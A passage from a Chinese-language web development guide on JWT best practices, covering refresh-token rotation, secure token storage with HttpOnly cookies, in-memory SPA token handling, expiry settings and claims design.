</span><span id="__span-87-32"><a id="__codelineno-87-32" name="__codelineno-87-32" href="#__codelineno-87-32"></a><span class="w">    </span><span class="n">refreshTokenRepository</span><span class="p">.</span><span class="na">save</span><span class="p">(</span><span class="n">entity</span><span class="p">);</span>
</span><span id="__span-87-33"><a id="__codelineno-87-33" name="__codelineno-87-33" href="#__codelineno-87-33"></a>
</span><span id="__span-87-34"><a id="__codelineno-87-34" name="__codelineno-87-34" href="#__codelineno-87-34"></a><span class="w">    </span><span class="c1">// 保存新Refresh Token</span>
</span><span id="__span-87-35"><a id="__codelineno-87-35" name="__codelineno-87-35" href="#__codelineno-87-35"></a><span class="w">    </span><span class="n">saveNewRefreshToken</span><span class="p">(</span><span class="n">userId</span><span class="p">,</span><span class="w"> </span><span class="n">newRefreshToken</span><span class="p">);</span>
</span><span id="__span-87-36"><a id="__codelineno-87-36" name="__codelineno-87-36" href="#__codelineno-87-36"></a>
</span><span id="__span-87-37"><a id="__codelineno-87-37" name="__codelineno-87-37" href="#__codelineno-87-37"></a><span class="w">    </span><span class="c1">// 5. 返回新Token对</span>
</span><span id="__span-87-38"><a id="__codelineno-87-38" name="__codelineno-87-38" href="#__codelineno-87-38"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TokenPair</span><span class="p">(</span><span class="n">newAccessToken</span><span class="p">,</span><span class="w"> </span><span class="n">newRefreshToken</span><span class="p">);</span>
</span><span id="__span-87-39"><a id="__codelineno-87-39" name="__codelineno-87-39" href="#__codelineno-87-39"></a><span class="p">}</span>
</span></code></pre></div></p>
<h3 id="26-jwt最佳实践">2.6 JWT最佳实践<a class="headerlink" href="#26-jwt最佳实践" title="链接到此标题">&para;</a></h3>
<h4 id="1-token存储位置选择">1. Token存储位置选择<a class="headerlink" href="#1-token存储位置选择" title="链接到此标题">&para;</a></h4>
<p><strong>选项对比：</strong></p>
<table>
<thead>
<tr>
<th>存储位置</th>
<th>安全性</th>
<th>XSS风险</th>
<th>CSRF风险</th>
<th>适用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>localStorage</strong></td>
<td>低</td>
<td>高（易被XSS窃取）</td>
<td>无</td>
<td>不推荐</td>
</tr>
<tr>
<td><strong>sessionStorage</strong></td>
<td>低</td>
<td>高（易被XSS窃取）</td>
<td>无</td>
<td>临时Token</td>
</tr>
<tr>
<td><strong>HttpOnly Cookie</strong></td>
<td>高</td>
<td>低（JavaScript无法访问）</td>
<td>有（需CSRF防护）</td>
<td><strong>推荐</strong></td>
</tr>
<tr>
<td><strong>内存变量</strong></td>
<td>最高</td>
<td>无</td>
<td>无</td>
<td>SPA应用</td>
</tr>
</tbody>
</table>
<p><strong>推荐方案：HttpOnly Cookie + SameSite</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="c1">// 服务器端设置Cookie</span>
</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setTokenCookie</span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a><span class="w">    </span><span class="n">Cookie</span><span class="w"> </span><span class="n">cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Cookie</span><span class="p">(</span><span class="s">&quot;access_token&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a>
</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a><span class="w">    </span><span class="c1">// 安全配置</span>
</span><span id="__span-88-6"><a id="__codelineno-88-6" name="__codelineno-88-6" href="#__codelineno-88-6"></a><span class="w">    </span><span class="n">cookie</span><span class="p">.</span><span class="na">setHttpOnly</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">              </span><span class="c1">// 防止JavaScript访问</span>
</span><span id="__span-88-7"><a id="__codelineno-88-7" name="__codelineno-88-7" href="#__codelineno-88-7"></a><span class="w">    </span><span class="n">cookie</span><span class="p">.</span><span class="na">setSecure</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">                </span><span class="c1">// 仅HTTPS传输</span>
</span><span id="__span-88-8"><a id="__codelineno-88-8" name="__codelineno-88-8" href="#__codelineno-88-8"></a><span class="w">    </span><span class="n">cookie</span><span class="p">.</span><span class="na">setSameSite</span><span class="p">(</span><span class="s">&quot;Strict&quot;</span><span class="p">);</span><span class="w">          </span><span class="c1">// 防止CSRF</span>
</span><span id="__span-88-9"><a id="__codelineno-88-9" name="__codelineno-88-9" href="#__codelineno-88-9"></a><span class="w">    </span><span class="n">cookie</span><span class="p">.</span><span class="na">setPath</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">);</span><span class="w">                   </span><span class="c1">// 全站有效</span>
</span><span id="__span-88-10"><a id="__codelineno-88-10" name="__codelineno-88-10" href="#__codelineno-88-10"></a><span class="w">    </span><span class="n">cookie</span><span class="p">.</span><span class="na">setMaxAge</span><span class="p">(</span><span class="mi">15</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">60</span><span class="p">);</span><span class="w">             </span><span class="c1">// 15分钟</span>
</span><span id="__span-88-11"><a id="__codelineno-88-11" name="__codelineno-88-11" href="#__codelineno-88-11"></a>
</span><span id="__span-88-12"><a id="__codelineno-88-12" name="__codelineno-88-12" href="#__codelineno-88-12"></a><span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="na">addCookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">);</span>
</span><span id="__span-88-13"><a id="__codelineno-88-13" name="__codelineno-88-13" href="#__codelineno-88-13"></a><span class="p">}</span>
</span><span id="__span-88-14"><a id="__codelineno-88-14" name="__codelineno-88-14" href="#__codelineno-88-14"></a>
</span><span id="__span-88-15"><a id="__codelineno-88-15" name="__codelineno-88-15" href="#__codelineno-88-15"></a><span class="c1">// 客户端自动携带Cookie</span>
</span><span id="__span-88-16"><a id="__codelineno-88-16" name="__codelineno-88-16" href="#__codelineno-88-16"></a><span class="c1">// 浏览器会自动在请求中包含Cookie，无需JavaScript操作</span>
</span></code></pre></div>
<p><strong>SPA应用方案：内存存储 + 自动刷新</strong></p>
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="c1">// 客户端代码</span>
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a><span class="kd">class</span><span class="w"> </span><span class="nx">TokenManager</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a><span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">  </span><span class="c1">// 内存存储</span>
</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">refreshTimer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
</span><span id="__span-89-6"><a id="__codelineno-89-6" name="__codelineno-89-6" href="#__codelineno-89-6"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-89-7"><a id="__codelineno-89-7" name="__codelineno-89-7" href="#__codelineno-89-7"></a>
</span><span id="__span-89-8"><a id="__codelineno-89-8" name="__codelineno-89-8" href="#__codelineno-89-8"></a><span class="w">    </span><span class="c1">// 登录后保存Token</span>
</span><span id="__span-89-9"><a id="__codelineno-89-9" name="__codelineno-89-9" href="#__codelineno-89-9"></a><span class="w">    </span><span class="nx">setToken</span><span class="p">(</span><span class="nx">accessToken</span><span class="p">,</span><span class="w"> </span><span class="nx">expiresIn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-10"><a id="__codelineno-89-10" name="__codelineno-89-10" href="#__codelineno-89-10"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">accessToken</span><span class="p">;</span>
</span><span id="__span-89-11"><a id="__codelineno-89-11" name="__codelineno-89-11" href="#__codelineno-89-11"></a>
</span><span id="__span-89-12"><a id="__codelineno-89-12" name="__codelineno-89-12" href="#__codelineno-89-12"></a><span class="w">        </span><span class="c1">// 在Token过期前5分钟自动刷新</span>
</span><span id="__span-89-13"><a id="__codelineno-89-13" name="__codelineno-89-13" href="#__codelineno-89-13"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">refreshTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">expiresIn</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">300</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">;</span>
</span><span id="__span-89-14"><a id="__codelineno-89-14" name="__codelineno-89-14" href="#__codelineno-89-14"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">refreshTimer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-15"><a id="__codelineno-89-15" name="__codelineno-89-15" href="#__codelineno-89-15"></a><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="nx">refreshAccessToken</span><span class="p">();</span>
</span><span id="__span-89-16"><a id="__codelineno-89-16" name="__codelineno-89-16" href="#__codelineno-89-16"></a><span class="w">        </span><span class="p">},</span><span class="w"> </span><span class="nx">refreshTime</span><span class="p">);</span>
</span><span id="__span-89-17"><a id="__codelineno-89-17" name="__codelineno-89-17" href="#__codelineno-89-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-89-18"><a id="__codelineno-89-18" name="__codelineno-89-18" href="#__codelineno-89-18"></a>
</span><span id="__span-89-19"><a id="__codelineno-89-19" name="__codelineno-89-19" href="#__codelineno-89-19"></a><span class="w">    </span><span class="c1">// 获取Token</span>
</span><span id="__span-89-20"><a id="__codelineno-89-20" name="__codelineno-89-20" href="#__codelineno-89-20"></a><span class="w">    </span><span class="nx">getToken</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-21"><a id="__codelineno-89-21" name="__codelineno-89-21" href="#__codelineno-89-21"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">accessToken</span><span class="p">;</span>
</span><span id="__span-89-22"><a id="__codelineno-89-22" name="__codelineno-89-22" href="#__codelineno-89-22"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-89-23"><a id="__codelineno-89-23" name="__codelineno-89-23" href="#__codelineno-89-23"></a>
</span><span id="__span-89-24"><a id="__codelineno-89-24" name="__codelineno-89-24" href="#__codelineno-89-24"></a><span class="w">    </span><span class="c1">// 刷新Token</span>
</span><span id="__span-89-25"><a id="__codelineno-89-25" name="__codelineno-89-25" href="#__codelineno-89-25"></a><span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">refreshAccessToken</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-26"><a id="__codelineno-89-26" name="__codelineno-89-26" href="#__codelineno-89-26"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/auth/refresh&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-27"><a id="__codelineno-89-27" name="__codelineno-89-27" href="#__codelineno-89-27"></a><span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span><span id="__span-89-28"><a id="__codelineno-89-28" name="__codelineno-89-28" href="#__codelineno-89-28"></a><span class="w">            </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;include&#39;</span><span class="w">  </span><span class="c1">// 携带Refresh Token Cookie</span>
</span><span id="__span-89-29"><a id="__codelineno-89-29" name="__codelineno-89-29" href="#__codelineno-89-29"></a><span class="w">        </span><span class="p">});</span>
</span><span id="__span-89-30"><a id="__codelineno-89-30" name="__codelineno-89-30" href="#__codelineno-89-30"></a>
</span><span id="__span-89-31"><a id="__codelineno-89-31" name="__codelineno-89-31" href="#__codelineno-89-31"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">access_token</span><span class="p">,</span><span class="w"> </span><span class="nx">expires_in</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
</span><span id="__span-89-32"><a id="__codelineno-89-32" name="__codelineno-89-32" href="#__codelineno-89-32"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">setToken</span><span class="p">(</span><span class="nx">access_token</span><span class="p">,</span><span class="w"> </span><span class="nx">expires_in</span><span class="p">);</span>
</span><span id="__span-89-33"><a id="__codelineno-89-33" name="__codelineno-89-33" href="#__codelineno-89-33"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-89-34"><a id="__codelineno-89-34" name="__codelineno-89-34" href="#__codelineno-89-34"></a>
</span><span id="__span-89-35"><a id="__codelineno-89-35" name="__codelineno-89-35" href="#__codelineno-89-35"></a><span class="w">    </span><span class="c1">// 登出时清除</span>
</span><span id="__span-89-36"><a id="__codelineno-89-36" name="__codelineno-89-36" href="#__codelineno-89-36"></a><span class="w">    </span><span class="nx">clearToken</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-37"><a id="__codelineno-89-37" name="__codelineno-89-37" href="#__codelineno-89-37"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
</span><span id="__span-89-38"><a id="__codelineno-89-38" name="__codelineno-89-38" href="#__codelineno-89-38"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">refreshTimer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-39"><a id="__codelineno-89-39" name="__codelineno-89-39" href="#__codelineno-89-39"></a><span class="w">            </span><span class="nx">clearTimeout</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">refreshTimer</span><span class="p">);</span>
</span><span id="__span-89-40"><a id="__codelineno-89-40" name="__codelineno-89-40" href="#__codelineno-89-40"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-89-41"><a id="__codelineno-89-41" name="__codelineno-89-41" href="#__codelineno-89-41"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-89-42"><a id="__codelineno-89-42" name="__codelineno-89-42" href="#__codelineno-89-42"></a><span class="p">}</span>
</span></code></pre></div>
<h4 id="2-token过期时间设置">2. Token过期时间设置<a class="headerlink" href="#2-token过期时间设置" title="链接到此标题">&para;</a></h4>
<p><strong>推荐配置：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>Access Token（访问令牌）：
</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>- 移动APP：60分钟
</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>- Web应用（SPA）：15分钟
</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a>- 后台服务调用：5分钟
</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a>- 高安全场景（银行）：5分钟
</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6" href="#__codelineno-90-6"></a>
</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7" href="#__codelineno-90-7"></a>Refresh Token（刷新令牌）：
</span><span id="__span-90-8"><a id="__codelineno-90-8" name="__codelineno-90-8" href="#__codelineno-90-8"></a>- 移动APP：30-90天
</span><span id="__span-90-9"><a id="__codelineno-90-9" name="__codelineno-90-9" href="#__codelineno-90-9"></a>- Web应用：7-14天
</span><span id="__span-90-10"><a id="__codelineno-90-10" name="__codelineno-90-10" href="#__codelineno-90-10"></a>- 高安全场景：1-3天
</span><span id="__span-90-11"><a id="__codelineno-90-11" name="__codelineno-90-11" href="#__codelineno-90-11"></a>
</span><span id="__span-90-12"><a id="__codelineno-90-12" name="__codelineno-90-12" href="#__codelineno-90-12"></a>原则：
</span><span id="__span-90-13"><a id="__codelineno-90-13" name="__codelineno-90-13" href="#__codelineno-90-13"></a>- Access Token越短越安全，但刷新频率越高
</span><span id="__span-90-14"><a id="__codelineno-90-14" name="__codelineno-90-14" href="#__codelineno-90-14"></a>- Refresh Token越长用户体验越好，但风险越高
</span><span id="__span-90-15"><a id="__codelineno-90-15" name="__codelineno-90-15" href="#__codelineno-90-15"></a>- 根据实际场景权衡
</span></code></pre></div>
<p><strong>实现示例：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JWTConfig</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a><span class="w">    </span><span class="c1">// Access Token配置</span>
</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Duration</span><span class="w"> </span><span class="n">ACCESS_TOKEN_VALIDITY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Duration</span><span class="p">.</span><span class="na">ofMinutes</span><span class="p">(</span><span class="mi">15</span><span class="p">);</span>
</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4" href="#__codelineno-91-4"></a>
</span><span id="__span-91-5"><a id="__codelineno-91-5" name="__codelineno-91-5" href="#__codelineno-91-5"></a><span class="w">    </span><span class="c1">// Refresh Token配置</span>
</span><span id="__span-91-6"><a id="__codelineno-91-6" name="__codelineno-91-6" href="#__codelineno-91-6"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Duration</span><span class="w"> </span><span class="n">REFRESH_TOKEN_VALIDITY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Duration</span><span class="p">.</span><span class="na">ofDays</span><span class="p">(</span><span class="mi">7</span><span class="p">);</span>
</span><span id="__span-91-7"><a id="__codelineno-91-7" name="__codelineno-91-7" href="#__codelineno-91-7"></a>
</span><span id="__span-91-8"><a id="__codelineno-91-8" name="__codelineno-91-8" href="#__codelineno-91-8"></a><span class="w">    </span><span class="c1">// 刷新窗口（在过期前多久可以刷新）</span>
</span><span id="__span-91-9"><a id="__codelineno-91-9" name="__codelineno-91-9" href="#__codelineno-91-9"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Duration</span><span class="w"> </span><span class="n">REFRESH_WINDOW</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Duration</span><span class="p">.</span><span class="na">ofMinutes</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span><span id="__span-91-10"><a id="__codelineno-91-10" name="__codelineno-91-10" href="#__codelineno-91-10"></a><span class="p">}</span>
</span></code></pre></div></p>
<h4 id="3-claims设计原则">3. Claims设计原则<a class="headerlink" href="#3-claims设计原则" title="链接到此标题">&para;</a></h4>
<p><strong>✅ 应该包含的Claims：</strong>
<div class="language-json highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a><span class="p">{</span>
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a><span class="w">  </span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user-123&quot;</span><span class="p">,</span><span class="w">              </span><span class="c1">// 用户ID（必需）</span>
</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a><span class="w">  </span><span class="nt">&quot;iss&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://auth.example.com&quot;</span><span class="p">,</span><span class="w">  </span><span class="c1">// 签发者</span>
</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a><span class="w">  </span><span class="nt">&quot;aud&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://api.example.com&quot;</span><span class="p">,</span><span class="w">   </span><span class="c1">// 受众</span>
</span><span id="__span-92-5"><a id="__codelineno-92-5" name="__codelineno-92-5" href="#__codelineno-92-5"></a><span class="w">  </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735689600</span><span class="p">,</span><span class="w">              </span><span class="c1">// 过期时间（必需）</span>
</span><span id="__span-92-6"><a id="__codelineno-92-6" name="__codelineno-92-6" href="#__codelineno-92-6"></a><span class="w">  </span><span class="nt">&quot;iat&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735686000</span><span class="p">,</span><span class="w">              </span><span class="c1">// 签发时间</span>
</span><span id="__span-92-7"><a id="__codelineno-92-7" name="__codelineno-92-7" href="#__codelineno-92-7"></a><span class="w">  </span><span class="nt">&quot;jti&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;token-uuid-123&quot;</span><span class="p">,</span><span class="w">        </span><span class="c1">// Token唯一ID（用于撤销）</span>
</span><span id="__span-92-8"><a id="__codelineno-92-8" name="__codelineno-92-8" href="#__codelineno-92-8"></a><span class="w">  </span><span class="nt">&quot;roles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">],</span><span class="w">     </span><span class="c1">// 角色（用于权限控制）</span>
</span><span id="__span-92-9"><a id="__codelineno-92-9" name="__codelineno-92-9" href="#__codelineno-92-9"></a><span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;write&quot;</span><span class="p">],</span><span class="w"> </span><span class="c1">// 权限</span>
</span><span id="__span-92-10"><a id="__codelineno-92-10" name="__codelineno-92-10" href="#__codelineno-92-10"></a><span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;access&quot;</span><span class="w">                </span><span class="c1">// Token类型</span>
</span><span id="__span-92-11"><a id="__codelineno-92-11" name="__codelineno-92-11" href="#__codelineno-92-11"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>❌ 不应该包含的信息：</strong>
<div class="language-json highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="p">{</span>
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a><span class="w">  </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;xxx&quot;</span><span class="p">,</span><span class="w">              </span><span class="c1">// ❌ 密码</span>
</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a><span class="w">  </span><span class="nt">&quot;creditCard&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1234-5678&quot;</span><span class="p">,</span><span class="w">      </span><span class="c1">// ❌ 敏感信息</span>
</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a><span class="w">  </span><span class="nt">&quot;ssn&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;123-45-6789&quot;</span><span class="p">,</span><span class="w">           </span><span class="c1">// ❌ 身份证号</span>
</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a><span class="w">  </span><span class="nt">&quot;privateKey&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;xxx&quot;</span><span class="w">             </span><span class="c1">// ❌ 密钥</span>
</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>设计原则：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>1. 最小化原则
</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>   - 只包含必要信息
</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>   - Token越小性能越好
</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a>
</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a>2. 不可变原则
</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a>   - Token签发后无法修改
</span><span id="__span-94-7"><a id="__codelineno-94-7" name="__codelineno-94-7" href="#__codelineno-94-7"></a>   - 需要更新信息时重新签发
</span><span id="__span-94-8"><a id="__codelineno-94-8" name="__codelineno-94-8" href="#__codelineno-94-8"></a>
</span><span id="__span-94-9"><a id="__codelineno-94-9" name="__codelineno-94-9" href="#__codelineno-94-9"></a>3. 公开性原则
</span><span id="__span-94-10"><a id="__codelineno-94-10" name="__codelineno-94-10" href="#__codelineno-94-10"></a>   - Payload可被任何人解码
</span><span id="__span-94-11"><a id="__codelineno-94-11" name="__codelineno-94-11" href="#__codelineno-94-11"></a>   - 不要存放敏感信息
</span><span id="__span-94-12"><a id="__codelineno-94-12" name="__codelineno-94-12" href="#__codelineno-94-12"></a>
</span><span id="__span-94-13"><a id="__codelineno-94-13" name="__codelineno-94-13" href="#__codelineno-94-13"></a>4. 标准化原则
</span><span id="__span-94-14"><a id="__codelineno-94-14" name="__codelineno-94-14" href="#__codelineno-94-14"></a>   - 优先使用标准Claims
</span><span id="__span-94-15"><a id="__codelineno-94-15" name="__codelineno-94-15" href="#__codelineno-94-15"></a>   - 自定义Claims命名规范
</span></code></pre></div></p>
<h4 id="4-多端登录管理">4. 多端登录管理<a class="headerlink" href="#4-多端登录管理" title="链接到此标题">&para;</a></h4>
<p><strong>场景1：单设备登录（踢出旧设备）</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">deviceId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a><span class="w">    </span><span class="c1">// 1. 验证凭证</span>
</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a><span class="w">    </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authenticate</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">);</span>
</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a>
</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a><span class="w">    </span><span class="c1">// 2. 撤销该用户所有旧Token</span>
